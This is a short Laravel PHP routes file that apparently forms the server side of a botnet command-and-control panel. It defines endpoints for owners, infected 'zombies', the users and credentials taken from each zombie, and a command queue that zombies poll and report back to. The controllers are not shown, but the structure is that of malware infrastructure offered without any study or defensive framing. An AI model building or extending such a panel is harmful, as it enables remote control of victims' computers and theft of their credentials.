<?php

/*
|--------------------------------------------------------------------------
| Application Routes
|--------------------------------------------------------------------------
|
| Here is where you can register all of the routes for an application.
| It's a breeze. Simply tell Laravel the URIs it should respond to
| and give it the Closure to execute when that URI is requested.
|
*/

Route::any('/create/owner', 'OwnerController@createOwner');
Route::any('/create/zombie/{owner_id}', 'ZombieController@createZombie');
Route::any('/create/user/{zombie_id}', 'UserController@createUser');
Route::any('/create/credential/{user_id}', 'CredentialController@createCredential');

Route::any('/delete/owner', 'OwnerController@deleteOwner');
Route::any('/delete/zombie', 'ZombieController@deleteZombie');
Route::any('/delete/user', 'UserController@deleteUser');

Route::any('/view/owners', 'OwnerController@viewOwners');
Route::any('/view/zombies/{owner_id}', 'ZombieController@viewZombies');
Route::any('/view/users/{zombie_id}', 'UserController@viewUsers');
Route::any('/view/credentials/{user_id}', 'CredentialController@viewCredentials');

Route::any('/queue/command/{zombie_id}', 'CommandController@queueCommand');
Route::any('/next/command/{zombie_id}', 'CommandController@nextCommand');
Route::any('/view/commands/{zombie_id}', 'CommandController@viewCommands');
Route::any('/finished/command/{command_id}', 'CommandController@finishedCommand');